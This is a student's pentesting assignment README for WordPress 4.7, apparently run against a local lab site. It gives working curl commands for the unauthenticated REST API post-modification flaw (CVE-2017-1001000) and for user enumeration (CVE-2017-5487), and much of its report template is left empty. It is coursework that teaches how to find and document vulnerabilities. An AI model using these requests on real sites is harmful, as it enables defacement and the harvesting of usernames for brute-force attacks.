# codepath_7_jlw15
Codepath assignment 7

Wordpress version 4.7

1.  Privilage Escalation.  Using the REST api, a URL post request can bypass the authentcation check and allow a non-authenticated user to make changes to a post.

Valid request:  curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5 -d '{"content":"hcked content"}'
Expected output: Status 401

Invalid request: curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5abc -d '{"content":"hcked content"}'
By adding the string 'abc" to the end of the post id(5) and reqesting a post which doesnt exist(123), I now have access to change content.

2. https://www.cvedetails.com/cve/CVE-2017-5487/ An attacker can use the REST api to get a list of all users who have published an post, including username and userid, which then could be used in a brute force attack.
curl -X GET http://wpdistillery.dev/wp-json/wp/v2/users

# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID
  - [ ] Summary: The register_routes function in wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php in the REST API in WordPress 4.7.x before 4.7.2 does not require an integer identifier, which allows remote attackers to modify arbitrary pages via a request for wp-json/wp/v2/posts followed by a numeric value and a non-numeric value, as demonstrated by the wp-json/wp/v2/posts/123?id=123helloworld URI.	
    - Vulnerability types:
    - Tested in version: 4.7
    - Fixed in version: 4.7.2
  - [x] GIF Walkthrough: ![](https://imgur.com/a/GsrEu)
  - [x] Steps to recreate: Privilage Escalation.  Using the REST api, a URL post request can bypass the authentcation check and allow a non-authenticated user to make changes to a post.

Valid request:  curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5 -d '{"content":"hcked content"}'
Expected output: Status 401

Invalid request: curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5abc -d '{"content":"hcked content"}'
By adding the string 'abc" to the end of the post id(5) and reqesting a post which doesnt exist(123), I now have access to change content.
  - [x] Affected source code: https://github.com/WordPress/WordPress/commit/e357195ce303017d517aff944644a7a1232926f7
    -[Link 1]https://www.cvedetails.com/cve/CVE-2017-1001000/ 
1. (Required)Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
